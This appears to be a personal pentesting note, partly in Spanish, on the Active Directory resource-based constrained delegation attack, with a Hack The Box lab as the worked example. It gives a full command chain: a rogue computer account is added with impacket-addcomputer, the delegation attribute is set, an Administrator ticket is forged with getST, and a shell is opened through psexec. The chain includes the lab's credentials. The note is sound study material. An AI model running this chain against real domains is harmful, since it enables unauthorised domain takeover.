

## DESCRIPTION

This is similar to the basic [Constrained Delegation](/windows-hardening/active-directory-methodology/constrained-delegation) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In this case, the constrained object will have an attribute called **_msDS-AllowedToActOnBehalfOfOtherIdentity_** with the name of the user that can impersonate any other user against it.

Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (In the other forms of Delegation you needed domain admin privs).

![[Pasted image 20230321203536.png]]

![[Pasted image 20230705195432.png]]

#### Mas información
* Writeup segurido (más facil): https://systemweakness.com/hackthebox-support-writeup-69fc8827c525
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
* Video s4vitar support

## EXPLOITATION

### OPTION 1: Herramienta rbcd-attack.py

Herramienta Github: https://github.com/tothi/rbcd-attack

Herramienta Kali: /home/kali/rbcd-attack

1. Añadimos una nueva máquina al dominio
```
impacket-addcomputer -computer-name '<<NOMBRE DEL PC QUE QUIERAS>>' -computer-pass <<CONTRASEÑA QUE QUERAMOS>> -dc-ip <<IP DC>> <<DOMINIO>>/<<USUARIO CON GENERIC ALL/WRITE SOBRE EL DC>>:<<PASS>>

#Ejemplo
impacket-addcomputer -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
```

![[Pasted image 20230321202746.png]]

2. Añadimos al computer creado a `msDS-AllowedToActOnBehalfOfOtherIdentity` 

```
./rbcd.py -f <<NOMBRE DEL PC QUE LE HEMOS DADO>> -t <<NOMBRE DEL DC>> -dc-ip <<IP DC>> <<DOMINIO>>/<<USUARIO CON GENERIC ALL/WRITE SOBRE EL DC>>:<<PASS>>

#Ejemplo
./rbcd.py -f EVILCOM -t DC -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful
```

![[Pasted image 20230321202813.png]]

3. Finally, we can get an impersonated Service Ticket for the target with Impacket’s getST.py script

```

#Ejemplo
impacket-getST -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support/EVILCOM$:password
```

![[Pasted image 20230321203049.png]]

4. Actualizamos el KRB5CCNAME

```
export KRB5CCNAME=`pwd`/Administrator.ccache;  
klist
```

![[Pasted image 20230321203121.png]]

5. Nos conectamos usando psexec

Imporante añadir antes al /etc/hosts
![[Pasted image 20230705195342.png]]

```
#Ejemplo 
impacket-psexec -k DC.support.htb
```

![[Pasted image 20230321203259.png]]

### OPTION 2: Se puede hacer de forma manual

Ver:
* https://0xdf.gitlab.io/2022/12/17/htb-support.html#auth-as-ldap
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
* https://www.youtube.com/watch?v=AlrB-uBUuTA&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29

## MACHINES

* Hack The Box: Support

